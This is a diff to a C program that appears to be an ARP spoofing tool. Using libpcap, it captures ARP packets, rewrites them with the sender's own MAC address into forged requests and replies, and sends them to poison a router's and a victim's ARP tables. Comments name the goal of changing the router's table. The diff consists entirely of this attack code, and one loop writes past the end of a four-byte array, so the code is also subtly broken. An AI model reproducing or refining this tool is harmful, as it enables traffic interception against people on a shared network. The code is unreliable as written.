@@ -46,6 +46,7 @@ u_char router_mac[6] = {0x00,0xd0,0xcb,0x86,0xe4,0x81};
 u_char router_ip[4];
 u_char victim_mac[6];
 u_char victim_ip[4];
+u_char broad_ip[4];
 
 u_char broadcast_f[6] = {0xFF,0xFF,0xFF,0xFF,0xFF,0xFF};
 u_char broadcast_0[6] = {0x00,0x00,0x00,0x00,0x00,0x00};
@@ -240,33 +241,35 @@ void callback(u_char *useless, const struct pcap_pkthdr *pkthdr, u_char *packet)
 
 		packet += size;
 		*(packet+1) = ARPOP_REQUEST;
-		packet -= size;
+		packet += sizeof(arpheader->oper);
+		for(i = 0; i < ETHER_ADDR_LEN; i++) *(packet+i) = *(broadcast_0+i);
+		packet -= size + sizeof(arpheader->oper);
+		printf("\nSend a Request Packet to victim...\n");
+		pcap_sendpacket(pcap, packet, length);
+		printf("Request Success!!\nYour request packet is..\n");
+		print_packet(length, packet);
 	}
 
 	// it is send packet to router for router's table change
-	if(*router_mac != 0 && ntohs(arpheader->oper) == ARPOP_REQUEST) {
-		printf("\nRequest Packet Creating..\n");
+	if(ntohs(arpheader->oper) == ARPOP_REQUEST && flag_check(eth->ether_shost, router_mac) != 1 && flag_check(arpheader->sha, router_mac) != 1) {
+		printf("\nRouter's Broadcast Receive!!\nPacket Creating..\n");
 		for(i = 0; i < ETHER_ADDR_LEN; i++) *(packet+i) = *(router_mac+i);
+
+		for(i = 0; i < ETHER_ADDR_LEN; i++) {
+			*(packet+i) = *(my_mac+i);
+			swap(packet+i, packet+(i+ETHER_ADDR_LEN));
+		}
 
 		packet += size;
-
 		*(packet+1) = ARPOP_REPLY;
-
-		packet += sizeof(arpheader->oper) + sizeof(arpheader->sha);
-
-		for(i = 0; i < 4; i++) *(packet+i) = *(victim_ip+i);
-
-		packet += sizeof(arpheader->spa);
-		
-		for(i = 0; i < ETHER_ADDR_LEN; i++) *(packet+i) = *(router_mac+i);
-		
-		packet += sizeof(arpheader->tha);
-		
-		for(i = 0; i < 4; i++) *(packet+i) = *(router_ip+i);
-
-		packet += sizeof(arpheader->tpa);
+		packet += sizeof(arpheader->oper);
+		for(i = 0; i < 10; i++) {
+			if(i < ETHER_ADDR_LEN) *(packet+(i+10)) = *(my_mac+i);
+			else *(broad_ip+i) = *(packet+(i+10));
+			swap(packet+i, packet+(i+10));
+		}
+		packet -= size + sizeof(arpheader->oper);
 		printf("\nPacket Creating Finished!!\nCreated Packet Sending...\n");
-		packet -= sizeof(struct libnet_ethernet_hdr) + sizeof(struct arphdr);
 		pcap_sendpacket(pcap, packet, length);
 		printf("Created Packet Send Success!!\nYour created_packet is..\n");
 		print_packet(length, packet);
